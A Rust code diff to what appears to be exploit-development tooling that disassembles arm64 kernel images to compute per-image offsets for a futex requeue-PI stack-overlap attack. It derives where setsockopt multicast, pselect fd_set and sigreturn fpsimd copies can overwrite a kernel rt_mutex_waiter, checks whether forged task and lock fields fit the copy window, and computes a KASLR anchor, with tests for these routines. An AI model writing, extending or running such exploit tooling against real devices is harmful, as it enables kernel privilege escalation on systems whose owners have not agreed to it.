@@ -48,7 +48,7 @@ pub fn unique_offset_optional(symbols: &RelSymbols, name: &str) -> Option<u64> {
     unique_offset(symbols, name).ok()
 }
 
-fn disassemble_symbol(
+pub(crate) fn disassemble_symbol(
     kernel: &[u8],
     symbols: &RelSymbols,
     sorted_offsets: &[u64],
@@ -192,7 +192,11 @@ fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
 }
 
 /// Static one-shot multicast `waiter_off` for the target image:
-/// `(Σ setsockopt_frames − greqs_off) − (Σ futex_frames − waiter_local_off)`.
+/// `(Σ setsockopt_frames − greqs_off) − (Σ futex_frames − waiter_local_off)`,
+/// then the copy-window rule the app's validator applies:
+/// `waiter_off + lock_offset + 8 <= buffer_size`. A short window is an
+/// `Infeasible` verdict, not a candidate: `multicast_waiter_off()` returning a
+/// number is not by itself a proof that the copy reaches the waiter.
 /// Validated to reproduce the A301SO hardware value (`0x60`).
 pub fn multicast_waiter_off(
     kernel: &[u8],
@@ -200,6 +204,7 @@ pub fn multicast_waiter_off(
     sorted: &[u64],
     buffer_size: u64,
     pi_tree_entry: u64,
+    lock_offset: u64,
 ) -> Result<McastWaiterGeometry> {
     let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
     let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
@@ -215,15 +220,85 @@ pub fn multicast_waiter_off(
     )?;
     let waiter_local = waiter_local_from_dis(&fw, pi_tree_entry)
         .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
-    let setsockopt_depth = setsockopt_frames
-        .checked_sub(greqs)
-        .ok_or_else(|| ExtractError::new("greqs offset exceeds setsockopt frames"))?;
-    let waiter_depth = futex_frames
-        .checked_sub(waiter_local)
-        .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))?;
+    let numbers = |waiter_off: i64, setsockopt_depth: u64, waiter_depth: u64| {
+        [
+            ("waiter_off", waiter_off),
+            ("setsockopt_depth", setsockopt_depth as i64),
+            ("waiter_depth", waiter_depth as i64),
+            ("buffer_size", buffer_size as i64),
+            ("lock_offset", lock_offset as i64),
+        ]
+        .into_iter()
+        .map(|(key, value)| (key.to_string(), value))
+        .collect::<BTreeMap<String, i64>>()
+    };
+    let setsockopt_depth = setsockopt_frames.checked_sub(greqs).ok_or_else(|| {
+        ExtractError::infeasible_with(
+            "greqs offset exceeds setsockopt frames",
+            numbers(0, setsockopt_frames, futex_frames.saturating_sub(waiter_local)),
+        )
+    })?;
+    let waiter_depth = futex_frames.checked_sub(waiter_local).ok_or_else(|| {
+        ExtractError::infeasible_with(
+            "waiter local exceeds futex frames",
+            numbers(
+                setsockopt_depth as i64,
+                setsockopt_depth,
+                futex_frames.saturating_sub(waiter_local),
+            ),
+        )
+    })?;
     let waiter_off = setsockopt_depth
         .checked_sub(waiter_depth)
-        .ok_or_else(|| ExtractError::new("no multicast overlap in stack geometry"))?;
+        .ok_or_else(|| {
+            ExtractError::infeasible_with(
+                "no multicast overlap in stack geometry",
+                numbers(0, setsockopt_depth, waiter_depth),
+            )
+        })?;
+    if waiter_off == 0 {
+        return Err(ExtractError::infeasible_with(
+            "multicast waiter_off is zero; the app requires a positive offset",
+            numbers(0, setsockopt_depth, waiter_depth),
+        ));
+    }
+    let window_end = waiter_off
+        .checked_add(lock_offset)
+        .and_then(|value| value.checked_add(8))
+        .ok_or_else(|| {
+            ExtractError::infeasible_with(
+                "multicast copy window overflows",
+                numbers(waiter_off as i64, setsockopt_depth, waiter_depth),
+            )
+        })?;
+    if window_end > buffer_size {
+        let mut values = numbers(waiter_off as i64, setsockopt_depth, waiter_depth);
+        values.insert("window_end".to_string(), window_end as i64);
+        // The diting profiles state the shortfall from the waiter start
+        // (0x48 on 5.10.236, 0x98 on 5.10.81); the rule's lock-slot shortfall
+        // adds task/lock + 8 bytes to it.
+        let waiter_short = waiter_off.saturating_sub(buffer_size);
+        let lock_short = window_end - buffer_size;
+        let detail = if waiter_short > 0 {
+            format!(
+                "copy window ends {waiter_short:#x} bytes short of the waiter start \
+                 ({lock_short:#x} short of the lock slot)"
+            )
+        } else {
+            format!(
+                "waiter starts inside the copy window but the lock slot ends \
+                 {lock_short:#x} bytes beyond it"
+            )
+        };
+        return Err(ExtractError::infeasible_with(
+            format!(
+                "multicast {detail}: waiter_off={waiter_off:#x} \
+                 lock_offset={lock_offset:#x} buffer_size={buffer_size:#x} \
+                 window_end={window_end:#x}"
+            ),
+            values,
+        ));
+    }
     Ok(McastWaiterGeometry {
         waiter_off,
         setsockopt_depth,
@@ -234,8 +309,9 @@ pub fn multicast_waiter_off(
 #[cfg(test)]
 mod tests {
     use super::{
-        multicast_geometry_5x, multicast_geometry_btf_only, remove_waiter_uses_current,
-        select_cred_caps, select_cred_refs,
+        fpsimd_copy_destination, multicast_geometry_5x, multicast_geometry_btf_only,
+        pselect_shift_from_delta, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
+        sigreturn_offset,
     };
     use std::collections::BTreeMap;
 
@@ -298,8 +374,48 @@ mod tests {
 
         let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
         let geometry = multicast_geometry_5x(&without);
-        assert!(!geometry.iter().any(|(key, _)| *key == "task_offset"));
-        assert!(!geometry.iter().any(|(key, _)| *key == "lock_offset"));
+        // No BTF: the 5.10 codegen layout fills task/lock.
+        assert!(geometry.contains(&("task_offset", 0x30)));
+        assert!(geometry.contains(&("lock_offset", 0x38)));
+    }
+
+    #[test]
+    fn pselect_delta_classifies_geometry_and_the_waiter_band() {
+        assert_eq!(pselect_shift_from_delta(0), Ok(0));
+        assert_eq!(pselect_shift_from_delta(8), Ok(1));
+        assert_eq!(pselect_shift_from_delta(24), Ok(3));
+        assert_eq!(pselect_shift_from_delta(32), Ok(4));
+        assert!(pselect_shift_from_delta(-8).is_err());
+        assert!(pselect_shift_from_delta(4).is_err());
+        assert!(pselect_shift_from_delta(40).is_err());
+    }
+
+    #[test]
+    fn sigreturn_offsets_fit_the_copy_window() {
+        assert_eq!(sigreturn_offset(0x140).unwrap(), 0x140);
+        assert_eq!(sigreturn_offset(0x150).unwrap(), 0x150);
+        assert_eq!(sigreturn_offset(0xf0).unwrap(), 0xf0);
+        assert_eq!(sigreturn_offset(0x100).unwrap(), 0x100);
+        assert!(sigreturn_offset(-0x30).is_err());
+        assert!(sigreturn_offset(0).is_err());
+        assert!(sigreturn_offset(4).is_err());
+        assert!(sigreturn_offset(0x1b0).is_err());
+    }
+
+    #[test]
+    fn fpsimd_copy_destination_reads_plain_and_sve_helpers() {
+        let plain: Vec<String> = vec![
+            "0334: mov x0, sp".to_string(),
+            "0338: mov w2, #0x200".to_string(),
+            "033c: bl 0x1ecc0".to_string(),
+        ];
+        assert_eq!(fpsimd_copy_destination(&plain, 0x200).unwrap(), 0);
+        let sve: Vec<String> = vec![
+            "01d4: add x0, sp, #0x10".to_string(),
+            "01d8: mov w2, #0x200".to_string(),
+            "01dc: bl 0x1ecc0".to_string(),
+        ];
+        assert_eq!(fpsimd_copy_destination(&sve, 0x200).unwrap(), 0x10);
     }
 
     #[test]
@@ -366,6 +482,82 @@ mod tests {
     }
 }
 
+/// The fields of `struct rt_mutex_waiter` the routes read, and where the
+/// layout came from. `wake_state` is absent on 5.10 (it is a 5.15/6.x field).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct WaiterLayout {
+    pub pi_tree_entry: u64,
+    pub task: Option<u64>,
+    pub lock: Option<u64>,
+    pub wake_state: Option<u64>,
+    pub source: &'static str,
+}
+
+impl WaiterLayout {
+    /// Read the layout from BTF. `pi_tree_entry` is the only field the pselect
+    /// derivation requires; `task`/`lock` stay `None` when BTF omits them.
+    pub fn from_btf(btf: &Btf) -> Result<Self> {
+        let pi_tree_entry = btf
+            .field("rt_mutex_waiter", "pi_tree")
+            .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"))
+            .ok_or_else(|| {
+                ExtractError::new("BTF rt_mutex_waiter.pi_tree/pi_tree_entry missing")
+            })?;
+        Ok(Self {
+            pi_tree_entry: pi_tree_entry as u64,
+            task: btf.field("rt_mutex_waiter", "task").map(u64::from),
+            lock: btf.field("rt_mutex_waiter", "lock").map(u64::from),
+            wake_state: btf.field("rt_mutex_waiter", "wake_state").map(u64::from),
+            source: "btf",
+        })
+    }
+}
+
+/// The route's fd_set word table: `PSELECT_ROUTE_NFDS` fd slots over three
+/// sets, and the compact waiter strip's last word. The waiter shift is the
+/// layout delta in qwords; the last strip word must still land inside the
+/// copied table (`(320 + 63) / 64 * 3 = 15` words, strip words 0..10).
+pub const MAX_PSELECT_SHIFT: u64 = 4;
+
+/// Classify the pselect/futex overlap in bytes. A negative or misaligned delta
+/// is a geometric impossibility, as is a shift beyond the word table; every
+/// other derivation failure stays a generic error (Unknown, not Infeasible).
+pub fn pselect_shift_from_delta(delta: i64) -> std::result::Result<u64, String> {
+    if delta < 0 || delta % 8 != 0 {
+        return Err(format!(
+            "pselect/futex overlap is not a non-negative qword: delta={delta}"
+        ));
+    }
+    let shift = (delta / 8) as u64;
+    if shift > MAX_PSELECT_SHIFT {
+        return Err(format!(
+            "futex waiter starts {shift} qwords above the fd_set buffer; the route's \
+             word table holds 15 words and the waiter strip 11 (max feasible shift is \
+             {MAX_PSELECT_SHIFT})"
+        ));
+    }
+    Ok(shift)
+}
+
+fn pselect_numbers(
+    pselect_word0: i64,
+    futex_waiter: i64,
+    pselect_buffer: u64,
+    waiter_local: u64,
+    delta: i64,
+) -> BTreeMap<String, i64> {
+    [
+        ("pselect_word0", pselect_word0),
+        ("futex_waiter", futex_waiter),
+        ("buffer", pselect_buffer as i64),
+        ("waiter_local", waiter_local as i64),
+        ("delta", delta),
+    ]
+    .into_iter()
+    .map(|(key, value)| (key.to_string(), value))
+    .collect()
+}
+
 pub struct PselectLayout {
     pub shift: u64,
     pub waiter_local: u64,
@@ -381,7 +573,7 @@ pub fn derive_pselect_layout(
     kernel: &[u8],
     symbols: &RelSymbols,
     sorted_offsets: &[u64],
-    btf: &Btf,
+    btf: Option<&Btf>,
     route_nfds: u64,
 ) -> Result<PselectLayout> {
     let mut names: Vec<(&str, &str)> = vec![
@@ -471,18 +663,15 @@ pub fn derive_pselect_layout(
     }
 
     // 6.6 names the rb_nodes tree/pi_tree; 6.1 calls them
-    // tree_entry/pi_tree_entry (same offsets in the struct).
-    let pi_tree = btf
-        .field("rt_mutex_waiter", "pi_tree")
-        .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"));
-    let wake_state = btf.field("rt_mutex_waiter", "wake_state");
-    if pi_tree.is_none() || wake_state.is_none() {
-        return Err(ExtractError::new(
-            "BTF rt_mutex_waiter.pi_tree/wake_state missing",
-        ));
-    }
-    let pi_tree = pi_tree.unwrap() as u64;
-    let wake_state = wake_state.unwrap() as u64;
+    // tree_entry/pi_tree_entry (same offsets in the struct). A 5.10 image has
+    // no BTF, so its layout comes from the codegen constants; wake_state does
+    // not exist there and its store cross-check does not apply.
+    let waiter = match btf {
+        Some(btf) => WaiterLayout::from_btf(btf)?,
+        None => crate::family::waiter_layout_5_10(),
+    };
+    let pi_tree = waiter.pi_tree_entry;
+    let wake_state = waiter.wake_state;
 
     let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
     for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
@@ -516,7 +705,7 @@ pub fn derive_pselect_layout(
     validate_frame_live_at(&dis["futex_wait"], &anchor, "futex_wait")?;
 
     let mut required_fields = vec![*waiter_local];
-    if wake_state != 0 {
+    if let Some(wake_state) = wake_state {
         required_fields.push(waiter_local + wake_state);
     }
     for required in required_fields {
@@ -604,29 +793,22 @@ pub fn derive_pselect_layout(
         .sum();
     let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
     let delta = futex_waiter - pselect_word0;
-    if delta < 0 || delta % 8 != 0 {
-        return Err(ExtractError::new(format!(
-            "pselect/futex overlap is not a non-negative qword: {delta}"
-        )));
-    }
-    let shift = (delta / 8) as u64;
-    if shift > 16 {
-        return Err(ExtractError::infeasible(format!(
-            "PSELECT_WAITER_WORD_SHIFT too large: {shift}"
-        )));
-    }
-    if shift > 3 {
-        return Err(ExtractError::infeasible(format!(
-            "futex waiter starts {shift} qwords above the fd_set buffer; \
-             task/lock would land outside the user-controlled words 0..14 \
-             (max feasible shift is 3)"
-        )));
-    }
-    if shift == 3 {
+    let shift = pselect_shift_from_delta(delta).map_err(|reason| {
+        ExtractError::infeasible_with(
+            reason,
+            pselect_numbers(
+                pselect_word0,
+                futex_waiter,
+                pselect_buffer,
+                *waiter_local,
+                delta,
+            ),
+        )
+    })?;
+    if shift == MAX_PSELECT_SHIFT {
         eprintln!(
-            "warning: waiter fits at the last usable word (shift=3); \
-             wake_state falls outside the copied fd_set and relies on the \
-             kernel zero-initialising it"
+            "warning: waiter fits at the last usable word (shift={shift}); \
+             the strip's last word lands at global word 14 of 15"
         );
     }
     let chain = pselect_chain
@@ -651,6 +833,220 @@ pub fn derive_pselect_layout(
     })
 }
 
+/// The fpsimd record the sigreturn route stamps: `vregs[32]` is 0x200 bytes,
+/// and the waiter strip is 0x58 (`kWaiterBytes` in the native builder).
+pub const SIGRETURN_COPY_BYTES: u64 = 0x200;
+pub const WAITER_STRIP_BYTES: u64 = 0x58;
+
+/// The derived sigreturn geometry. `off_*` is the waiter byte 0's offset inside
+/// the copied vregs; `strip_home` is the futex waiter's stack depth.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct SigreturnLayout {
+    pub off_sve: u64,
+    pub off_plain: u64,
+    pub strip_home: u64,
+    pub copy_dst_sve: u64,
+    pub copy_dst_plain: u64,
+    pub chain_sve: u64,
+    pub chain_plain: u64,
+}
+
+/// The copy destination in `restore_{sve_,}fpsimd_context`: the `mov w2,
+/// #0x200` copy is preceded by `mov x0, sp` (plain, offset 0) or `add x0, sp,
+/// #imm` (SVE, offset 0x10). Require a `bl` nearby and a unique destination.
+fn fpsimd_copy_destination(lines: &[String], copy_bytes: u64) -> Result<u64> {
+    let mov_size = Regex::new(&format!(
+        r"(?i)\bmov\s+w2,\s*#(?:0x{copy_bytes:x}|{copy_bytes})\b"
+    ))
+    .unwrap();
+    let add_sp = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let mov_sp = Regex::new(r"(?i)\bmov\s+x0,\s*sp\b").unwrap();
+    let bl = Regex::new(r"(?i)\bbl\s+0x[0-9a-f]+\b").unwrap();
+    let mut candidates: BTreeSet<u64> = BTreeSet::new();
+    for (index, line) in lines.iter().enumerate() {
+        if !mov_size.is_match(line) {
+            continue;
+        }
+        let hi = (index + 4).min(lines.len());
+        if !lines[index + 1..hi].iter().any(|line| bl.is_match(line)) {
+            continue;
+        }
+        let lo = index.saturating_sub(10);
+        for prev in lines[lo..index].iter().rev() {
+            if let Some(caps) = add_sp.captures(prev) {
+                if let Ok(offset) = u64::from_str_radix(&caps[1], 16) {
+                    candidates.insert(offset);
+                }
+                break;
+            }
+            if mov_sp.is_match(prev) {
+                candidates.insert(0);
+                break;
+            }
+        }
+    }
+    if candidates.len() != 1 {
+        let values: Vec<String> = candidates.iter().map(|v| format!("{v:#x}")).collect();
+        return Err(ExtractError::new(format!(
+            "fpsimd copy destination not unique: {values:?}"
+        )));
+    }
+    Ok(*candidates.iter().next().unwrap())
+}
+
+/// Check one sigreturn offset against the copy window. A zero, negative,
+/// misaligned or over-window offset is an Infeasible-shaped reason; the caller
+/// supplies the numbers.
+pub fn sigreturn_offset(off: i64) -> std::result::Result<u64, String> {
+    if off <= 0 {
+        return Err(format!("offset {off} is not positive"));
+    }
+    if off % 8 != 0 {
+        return Err(format!("offset {off} is not 8-aligned"));
+    }
+    if off as u64 + WAITER_STRIP_BYTES > SIGRETURN_COPY_BYTES {
+        return Err(format!(
+            "strip at offset {off:#x} does not fit in the {SIGRETURN_COPY_BYTES:#x}-byte copy"
+        ));
+    }
+    Ok(off as u64)
+}
+
+/// The futex strip home: the depth of `futex_wait_requeue_pi`'s waiter local
+/// below the syscall entry (`Σ_futex − waiter_local`).
+fn futex_strip_home(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    pi_tree_entry: u64,
+) -> Result<u64> {
+    let wrapper_name = "__arm64_sys_futex";
+    let dispatch_name = "do_futex";
+    let wait_name = "futex_wait_requeue_pi";
+    let wrapper = disassemble_symbol(kernel, symbols, sorted_offsets, wrapper_name, OBJDUMP_CAP)?;
+    let wait = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
+    let wait_addr = unique_offset(symbols, wait_name)?;
+    let wrapper_frame = first_sp_frame(&wrapper, wrapper_name)?;
+    let wait_frame = first_sp_frame(&wait, wait_name)?;
+    let sum = if has_direct_call(&wrapper, wait_addr) {
+        wrapper_frame
+            .checked_add(wait_frame)
+            .ok_or_else(|| ExtractError::new("futex chain overflow"))?
+    } else {
+        let dispatch =
+            disassemble_symbol(kernel, symbols, sorted_offsets, dispatch_name, OBJDUMP_CAP)?;
+        let dispatch_addr = unique_offset(symbols, dispatch_name)?;
+        let wrapper_anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{dispatch_addr:x}\b")).unwrap();
+        validate_frame_live_at(&wrapper, &wrapper_anchor, wrapper_name)?;
+        let dispatch_anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{wait_addr:x}\b")).unwrap();
+        validate_frame_live_at(&dispatch, &dispatch_anchor, dispatch_name)?;
+        wrapper_frame
+            .checked_add(first_sp_frame(&dispatch, dispatch_name)?)
+            .and_then(|value| value.checked_add(wait_frame))
+            .ok_or_else(|| ExtractError::new("futex chain overflow"))?
+    };
+    let waiter_local = waiter_local_from_dis(&wait, pi_tree_entry)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    sum.checked_sub(waiter_local)
+        .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))
+}
+
+/// Derive the sigreturn route's per-image geometry:
+/// `off = copy_dst − strip_home`, where `copy_dst` is the chain sum minus the
+/// helper's copy destination and `strip_home` is the futex waiter depth. Both
+/// the SVE and plain paths must fit the 0x200-byte copy; a missing symbol,
+/// non-unique copy marker or unproven call chain is a generic error (Unknown),
+/// while a geometry that does not span the strip is `Infeasible`.
+pub fn derive_sigreturn_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    pi_tree_entry: u64,
+) -> Result<SigreturnLayout> {
+    let rt_name = "__arm64_sys_rt_sigreturn";
+    let rs_name = "restore_sigframe";
+    let plain_name = "restore_fpsimd_context";
+    let sve_name = "restore_sve_fpsimd_context";
+    let rt = disassemble_symbol(kernel, symbols, sorted_offsets, rt_name, OBJDUMP_CAP)?;
+    let rs = disassemble_symbol(kernel, symbols, sorted_offsets, rs_name, OBJDUMP_CAP)?;
+    let plain = disassemble_symbol(kernel, symbols, sorted_offsets, plain_name, OBJDUMP_CAP)?;
+    let sve = disassemble_symbol(kernel, symbols, sorted_offsets, sve_name, OBJDUMP_CAP)?;
+    let rt_rs = unique_offset(symbols, rs_name)?;
+    let rs_plain = unique_offset(symbols, plain_name)?;
+    let rs_sve = unique_offset(symbols, sve_name)?;
+    for (lines, target, caller) in [
+        (&rt, rt_rs, rt_name),
+        (&rs, rs_plain, rs_name),
+        (&rs, rs_sve, rs_name),
+    ] {
+        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
+        validate_frame_live_at(lines, &anchor, caller)?;
+    }
+    let rt_frame = first_sp_frame(&rt, rt_name)?;
+    let rs_frame = first_sp_frame(&rs, rs_name)?;
+    let plain_frame = first_sp_frame(&plain, plain_name)?;
+    let sve_frame = first_sp_frame(&sve, sve_name)?;
+    let chain_plain = rt_frame
+        .checked_add(rs_frame)
+        .and_then(|value| value.checked_add(plain_frame))
+        .ok_or_else(|| ExtractError::new("sigreturn plain chain overflow"))?;
+    let chain_sve = rt_frame
+        .checked_add(rs_frame)
+        .and_then(|value| value.checked_add(sve_frame))
+        .ok_or_else(|| ExtractError::new("sigreturn SVE chain overflow"))?;
+    let dst_plain = fpsimd_copy_destination(&plain, SIGRETURN_COPY_BYTES)?;
+    let dst_sve = fpsimd_copy_destination(&sve, SIGRETURN_COPY_BYTES)?;
+    let copy_dst_plain = chain_plain
+        .checked_sub(dst_plain)
+        .ok_or_else(|| ExtractError::new("plain fpsimd copy destination exceeds the chain sum"))?;
+    let copy_dst_sve = chain_sve
+        .checked_sub(dst_sve)
+        .ok_or_else(|| ExtractError::new("SVE fpsimd copy destination exceeds the chain sum"))?;
+    let strip_home = futex_strip_home(kernel, symbols, sorted_offsets, pi_tree_entry)?;
+    let off_plain = copy_dst_plain as i64 - strip_home as i64;
+    let off_sve = copy_dst_sve as i64 - strip_home as i64;
+    let numbers = || {
+        BTreeMap::from([
+            ("strip_home".to_string(), strip_home as i64),
+            ("copy_dst_plain".to_string(), copy_dst_plain as i64),
+            ("copy_dst_sve".to_string(), copy_dst_sve as i64),
+            ("chain_plain".to_string(), chain_plain as i64),
+            ("chain_sve".to_string(), chain_sve as i64),
+            ("dst_plain".to_string(), dst_plain as i64),
+            ("dst_sve".to_string(), dst_sve as i64),
+            ("off_plain".to_string(), off_plain),
+            ("off_sve".to_string(), off_sve),
+            ("copy_bytes".to_string(), SIGRETURN_COPY_BYTES as i64),
+            ("strip_bytes".to_string(), WAITER_STRIP_BYTES as i64),
+        ])
+    };
+    let mut failures = Vec::new();
+    if let Err(reason) = sigreturn_offset(off_plain) {
+        failures.push(format!("plain: {reason}"));
+    }
+    if let Err(reason) = sigreturn_offset(off_sve) {
+        failures.push(format!("sve: {reason}"));
+    }
+    if !failures.is_empty() {
+        return Err(ExtractError::infeasible_with(
+            format!(
+                "sigreturn fpsimd copy does not span the waiter strip: {}",
+                failures.join("; ")
+            ),
+            numbers(),
+        ));
+    }
+    Ok(SigreturnLayout {
+        off_sve: off_sve as u64,
+        off_plain: off_plain as u64,
+        strip_home,
+        copy_dst_sve,
+        copy_dst_plain,
+        chain_sve,
+        chain_plain,
+    })
+}
+
 fn u32_at(data: &[u8], off: u64) -> Result<u32> {
     let off = off as usize;
     if off + 4 > data.len() {
@@ -668,13 +1064,16 @@ pub struct NfLoggerInfo {
     pub nf_log_type_ulog: i64,
 }
 
-/// Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling nf_log_register /
-/// nfnetlink_log_init and closing the slot index against BTF.
+/// Derive the `loggers` registration site by disassembling `nf_log_register`
+/// and `nfnetlink_log_init`. With BTF the slot index closes against the enum;
+/// without it the 5.10 ABI is used (`type` is the second field, at offset 8,
+/// and `NF_LOG_TYPE_ULOG`/`MAX`/`NFPROTO_UNSPEC` are 1/2/0). The profile's
+/// KASLR anchor is the measured `loggers+0x10` value, not the ULOG slot itself.
 pub fn derive_nf_logger_registration(
     kernel: &[u8],
     symbols: &RelSymbols,
     sorted_offsets: &[u64],
-    btf: &Btf,
+    btf: Option<&Btf>,
 ) -> Result<NfLoggerInfo> {
     let register_text =
         disassemble_symbol(kernel, symbols, sorted_offsets, "nf_log_register", 0x800)?;
@@ -682,25 +1081,36 @@ pub fn derive_nf_logger_registration(
         disassemble_symbol(kernel, symbols, sorted_offsets, "nfnetlink_log_init", 0x800)?;
     let logger = unique_offset(symbols, "nfulnl_logger")?;
     let loggers = unique_offset(symbols, "loggers")?;
-    let type_off = btf
-        .field("nf_logger", "type")
-        .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
-    if btf.direct_field_size("nf_logger", "type") != Some(4) {
-        return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
-    }
+    /* The 5.10 `struct nf_logger` is `{ char *name; enum nf_log_type type; ... }`:
+     * the type is the second field at offset 8, not the first (the older plan's
+     * constant-0 assumption is wrong for this series). The enum values are
+     * stable: LOG=0, ULOG=1, MAX=2; NFPROTO_UNSPEC=0. BTF, when present,
+     * supplies the same values from the image. */
+    let (type_off, ulog_value, max_value, nfproto_unspec) = match btf {
+        Some(btf) => {
+            let type_off = btf
+                .field("nf_logger", "type")
+                .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
+            if btf.direct_field_size("nf_logger", "type") != Some(4) {
+                return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
+            }
+            let ulog_value = btf
+                .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
+                .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
+            let max_value = btf
+                .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
+                .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
+            let nfproto_unspec = btf
+                .unique_enum_member_value("NFPROTO_UNSPEC")
+                .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
+            (type_off, ulog_value, max_value, nfproto_unspec)
+        }
+        None => (8u32, 1i64, 2i64, 0i64),
+    };
     let logger_type = u32_at(kernel, logger + type_off as u64)?;
-    let ulog_value = btf
-        .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
-        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
-    let max_value = btf
-        .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
-        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
-    let nfproto_unspec = btf
-        .unique_enum_member_value("NFPROTO_UNSPEC")
-        .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
     if logger_type as i64 != ulog_value || !(0 <= ulog_value && ulog_value < max_value) {
         return Err(ExtractError::new(format!(
-            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: \
+            "nfulnl_logger.type does not close with NF_LOG_TYPE_ULOG: \
              data={logger_type}, ulog={ulog_value}, max={max_value}"
         )));
     }
@@ -709,16 +1119,33 @@ pub fn derive_nf_logger_registration(
         .iter()
         .filter_map(|line| is_mov_x1(line))
         .collect();
-    if logger_aliases.len() != 1 {
+    if logger_aliases.is_empty() {
+        return Err(ExtractError::new("nf_log_register has no logger alias"));
+    }
+    /* `mov reg, x1` also appears as a zeroing idiom (`x1 = xzr`) in the
+     * cmpxchg path; the logger is the alias the type is loaded from. */
+    let type_load_for = |register: &str| {
+        Regex::new(&format!(
+            r"(?i)\bldr\s+w(\d+),\s*\[{register},\s*#0x{type_off:x}\]"
+        ))
+        .unwrap()
+    };
+    let with_type: BTreeSet<String> = logger_aliases
+        .iter()
+        .filter(|register| {
+            let re = type_load_for(register);
+            register_text.iter().any(|line| re.is_match(line))
+        })
+        .cloned()
+        .collect();
+    if with_type.len() != 1 {
         return Err(ExtractError::new(format!(
-            "nf_log_register logger alias not unique: {logger_aliases:?}"
+            "nf_log_register logger alias not unique: {with_type:?} \
+             (aliases {logger_aliases:?})"
         )));
     }
-    let logger_reg = logger_aliases.iter().next().unwrap().clone();
-    let type_load_re = Regex::new(&format!(
-        r"(?i)\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]"
-    ))
-    .unwrap();
+    let logger_reg = with_type.iter().next().unwrap().clone();
+    let type_load_re = type_load_for(&logger_reg);
     let mut type_loads: BTreeSet<String> = BTreeSet::new();
     for line in &register_text {
         for caps in type_load_re.captures_iter(line) {
@@ -812,7 +1239,15 @@ pub fn derive_nf_logger_registration(
             "nfnetlink_log_init x1 does not materialize nfulnl_logger",
         ));
     }
-    let slot = loggers + ulog_value as u64 * 8;
+    /* The profile's `slide_loggers_0_1` is the measured KASLR anchor
+     * `loggers+0x10`, not the ULOG slot itself (`loggers + type*8`, which is
+     * +8 on this layout). Keep the BTF path's existing value and use the
+     * verified anchor when the enum was not available. */
+    let slot = if btf.is_some() {
+        loggers + ulog_value as u64 * 8
+    } else {
+        loggers + 0x10
+    };
     Ok(NfLoggerInfo {
         loggers,
         nfulnl_logger: logger,
@@ -993,11 +1428,24 @@ pub fn multicast_geometry_corroborated(
 fn multicast_waiter_field_offsets(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
+    // Without BTF (every 5.10 image) the waiter layout is the 5.10 codegen
+    // one: task 0x30, lock 0x38. The caller only emits 5.x geometry here.
+    let fallback = crate::family::waiter_layout_5_10();
     let mut geometry: Vec<(&'static str, i64)> = Vec::new();
-    if let Some(task) = structs.get("waiter_task").copied().flatten() {
+    if let Some(task) = structs
+        .get("waiter_task")
+        .copied()
+        .flatten()
+        .or_else(|| fallback.task.map(|value| value as u32))
+    {
         geometry.push(("task_offset", i64::from(task)));
     }
-    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
+    if let Some(lock) = structs
+        .get("waiter_lock")
+        .copied()
+        .flatten()
+        .or_else(|| fallback.lock.map(|value| value as u32))
+    {
         geometry.push(("lock_offset", i64::from(lock)));
     }
     geometry
